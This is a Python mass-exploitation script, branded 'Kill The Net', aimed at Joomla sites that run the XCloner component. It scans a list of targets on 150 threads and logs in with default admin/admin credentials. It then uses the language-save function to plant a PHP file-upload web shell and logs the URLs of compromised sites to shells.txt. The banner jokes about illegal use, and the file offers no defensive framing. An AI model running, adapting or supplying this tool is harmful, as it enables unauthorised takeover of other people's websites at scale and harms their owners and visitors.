# -*- coding: utf-8 -*
#!/usr/bin/python
#####################################
##KILL THE NET##
#### PS: CHANGE Your Threads pool on line 142 to make script more faster :)
##############[LIBS]###################
import requests, re, urllib2, os, sys, codecs, random				
from multiprocessing.dummy import Pool					     	
from time import time as timer	
import time				   		
from platform import system	
from colorama import Fore								
from colorama import Style								
from pprint import pprint								
from colorama import init
from urlparse import urlparse
import warnings
import subprocess
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore',InsecureRequestWarning)
reload(sys)  
sys.setdefaultencoding('utf8')
init(autoreset=True)
##########################################################################################
ktnred = '\033[31m'
ktngreen = '\033[32m'
ktn3yell = '\033[33m'
ktn4blue = '\033[34m'
ktn5purp = '\033[35m'
ktn6blueblue = '\033[36m'
ktn7grey = '\033[37m'
CEND = '\033[0m'		
#####################################
##########################################################################################
try:
	with codecs.open(sys.argv[1], mode='r', encoding='ascii', errors='ignore') as f:
		ooo = f.read().splitlines()
except IndexError:
	print (ktnred + '[+]================> ' + 'USAGE: '+sys.argv[0]+' listsite.txt' + CEND)
	pass
ooo = list((ooo))
##########################################################################################
se = requests.session()
Agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
shell = '''
<?php
echo "killz";
$files = @$_FILES["files"];
if ($files["name"] != '') {
    $fullpath = $_REQUEST["path"] . $files["name"];
    if (move_uploaded_file($files['tmp_name'], $fullpath)) {
        echo "<h1><a href='$fullpath'>OK-Click here!</a></h1>";
    }
}echo '<html><head><title>Upload files...</title></head><body><form method=POST enctype="multipart/form-data" action=""><input type=text name=path><input type="file" name="files"><input type=submit value="Up"></form></body></html>';
?>'''

def check(url):
	try:
		exp = url + '/administrator/components/com_xcloner-backupandrestore/index2.php'
		check1 = se.get(exp, headers=Agent, timeout=20, verify=False, allow_redirects=False)
		if 'Authentication Area:' in check1.content:
			print(ktngreen + '[SITE_VULN]========> ' + url + CEND)
			open('vuln.txt', 'a').write(exp + '\n')
			exploit(exp, url)
		else:
			print(ktnred + '[SITE_NOT_VULN]========> ' + url + CEND)

		pass
	except:
		pass
	pass

def exploit(exp, url):
	try:
		data1 = {'username': 'admin','password': 'admin','option': 'com_cloner','task': 'dologin','boxchecked': 0,'hidemainmenu': 0}
		check2 = se.post(exp, headers=Agent, data=data1, verify=False, timeout=20)
		if 'mosmsg=Welcome+to+XCloner+backend' in check2.text:
			print(ktn3yell + '[UPLOADING SHELL...]========> ' + url + CEND)
			getshell(exp, url)
			pass
		else:
			print(ktnred + '[SORRY CANT UPLOAD SHELL...]========> ' + url + CEND)
	except:
		pass
	pass


def getshell(exp, url):
	try:
		data2= {'def_content':shell,'option':'com_cloner','language':'english','task':'save_lang','boxchecked':0,'hidemainmenu':0}
		Agent3 = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
		check3 = se.post(exp, headers=Agent, data=data2, verify=False, timeout=20)
		if 'successfully' in check3.content:
			ktnshell = url + '/administrator/components/com_xcloner-backupandrestore/language/english.php'
			check4 = se.get(ktnshell, headers=Agent, verify=False, timeout=20)
			if 'killz' in check4.content:
				print(ktn5purp + '[SHELL UPLOADED]========> ' + url + CEND)
				open('shells.txt', 'a').write(ktnshell + '\n')
				pass
			else:
				print(ktnred + '[SORRY CANT UPLOAD SHELL...]========> ' + url + CEND)
			
		else:
			print(ktnred + '[SORRY CANT UPLOAD SHELL...]========> ' + url + CEND)
			pass

	except:
		pass
##########################################################################################
def logo():
	clear = "\x1b[0m"
	colors = [36, 32, 34, 35, 31, 37]
	x = ''' 
				 FEDERATION BLACK HAT SYSTEM | IG: @_gghost666_ 
<-.(`-')  _                      (`-')      (`-').-> (`-')  _<-. (`-')_  (`-')  _(`-')      
 __( OO) (_)      <-.      <-.   ( OO).->   (OO )__  ( OO).-/   \( OO) ) ( OO).-/( OO).->   
'-'. ,--.,-(`-'),--. )   ,--. )  /    '._  ,--. ,'-'(,------.,--./ ,--/ (,------./    '._   
|  .'   /| ( OO)|  (`-') |  (`-')|'--...__)|  | |  | |  .---'|   \ |  |  |  .---'|'--...__) 
|      /)|  |  )|  |OO ) |  |OO )`--.  .--'|  `-'  |(|  '--. |  . '|  |)(|  '--. `--.  .--' 
|  .   '(|  |_/(|  '__ |(|  '__ |   |  |   |  .-.  | |  .--' |  |\    |  |  .--'    |  |    
|  |\   \|  |'->|     |' |     |'   |  |   |  | |  | |  `---.|  | \   |  |  `---.   |  |    
`--' '--'`--'   `-----'  `-----'    `--'   `--' `--' `------'`--'  `--'  `------'   `--'    
									  KILL THE NET
									 FB: fb/KtN.1990  
			   Note! : We Accept any responsibility for any illegal usage :). '''

	for N, line in enumerate(x.split("\n")):
		sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
		time.sleep(0.05)
		pass


logo()
##########################################################################################
def Main():
	try:
		
		start = timer()
		ThreadPool = Pool(150)
		Threads = ThreadPool.map(check, ooo)
		print('TIME TAKE: ' + str(timer() - start) + ' S')
	except:
		pass


if __name__ == '__main__':
	Main()
